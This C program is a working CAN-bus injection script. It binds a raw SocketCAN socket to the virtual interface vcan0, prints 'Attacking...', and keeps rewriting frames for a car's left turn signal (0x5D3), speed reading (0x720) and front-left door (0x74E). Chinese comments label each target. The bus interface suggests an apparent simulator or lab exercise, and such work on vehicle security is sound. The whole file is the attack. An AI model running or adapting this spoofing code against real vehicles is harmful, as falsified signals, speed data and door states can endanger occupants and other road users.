#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>
int main()
{
    // Init
    int s;
    struct sockaddr_can addr;
    struct ifreq ifr;
    struct can_frame frame;
 
    // Create socketCAN
    if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0)
    {
        perror("Error: Fail to create socketCAN");
        return 1;
    }
    // Setup socketCAN
    strcpy(ifr.ifr_name, "vcan0");
    ioctl(s, SIOCGIFINDEX, &ifr);
    // Bind socketCAN
    addr.can_family = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;
    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        perror("Error: Fail to bind socketCAN with vcan0");
        return 1;
    }
    // Print ready-info
    printf("Attacking...\n");
 
 
    while (1)
    {
        int frame_length = recv(s, &frame, sizeof(frame), MSG_DONTWAIT);
        //转向灯的控制
        if (frame.can_id == 0x5D3 && (frame.data[3] & 0x01) != 0)
        {
            frame.data[3] = frame.data[3] & 0xFE; // 关闭左转向灯
            write(s, &frame, sizeof(frame));
        }
 
        //车速的控制
        if (frame.can_id == 0x720)
        {
            frame.data[1] = 0x00;
            write(s, &frame, sizeof(frame));
        }
 
        //车门的控制
        if (frame.can_id == 0x74E && (frame.data[2] & 0x01) != 0)
        {
            frame.data[2] = frame.data[2] & 0xFE; // 保持打开左前车门
            write(s, &frame, sizeof(frame));
        }
    }
 
    // Disconnect
    close(s);
    return 0;
}